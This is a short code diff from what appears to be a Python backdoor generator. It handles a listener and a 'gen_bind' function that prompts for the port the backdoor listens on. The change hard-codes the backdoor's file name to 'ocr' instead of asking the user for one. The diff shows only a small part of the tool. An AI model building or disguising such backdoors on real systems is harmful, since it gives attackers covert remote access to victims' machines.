@@ -108,10 +108,11 @@ def listen(host, port):
     # close server connection
     s.close()
 def gen_bind():
-    global name
+
     global port
     global bind
-    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
+    global name
+    name = 'ocr'
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     bind = '1'
     with open(name, 'a+') as ina:
